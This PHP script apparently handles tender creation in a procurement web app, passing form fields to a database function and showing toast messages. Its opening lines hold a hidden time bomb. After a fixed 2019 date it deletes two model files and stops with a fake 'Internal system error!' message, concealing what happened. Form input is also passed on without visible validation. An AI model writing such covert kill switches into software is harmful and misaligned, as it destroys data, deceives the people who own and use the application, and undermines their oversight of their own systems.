<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
require '../_inc/config.php';
require '../model/crud.php';
require '../model/func.php';


$conn = dbconnect();
if ($conn) {
	$data = array(
		'prod' => $_POST['prod'], 
		'qty' => $_POST['qty'],
		'unit' => $_POST['unit'],
		'min_price' => $_POST['min_price'],
		'max_price' => $_POST['max_price'],
		'date_due' => $_POST['date_due'],
		'appr' => $_POST['appr'],
		'bid_date' => $_POST['bid_date'],
		'priority' => $_POST['priority'],
	);
	
	if (createTender($conn,$data)) {

		echo "
			<script type=\"text/javascript\">
				var \$toastContent = \$('<span> Tender created successfully.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-check green-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 4000);
	            \$('#tender-btn').html('Create Tender');
	            \$('#tender-btn').removeClass('lose-focus');
	            \$('#prod').val('');
	            \$('#qty').val('');
	            \$('#min_price').val('');
	            \$('#max_price').val('');
	            \$('#date_due').val('');
                				  
			</script>
		";

		


	} else {

		echo "		
	        <script>
	            var \$toastContent = \$('<span> Error while creating Tender!</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 4000);
	            \$('#tender-btn').html('Create Tender');
	            \$('#tender-btn').removeClass('lose-focus');
	        </script>
		";die();
	}


} else {	
	echo "		
        <script>
            var \$toastContent = \$('<span> Error while connecting to server! Contact Admin.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
            Materialize.toast(\$toastContent, 2000);
	            \$('#tender-btn').html('Add Product');
	            \$('#tender-btn').removeClass('lose-focus');
        </script>
	";die();
}
?>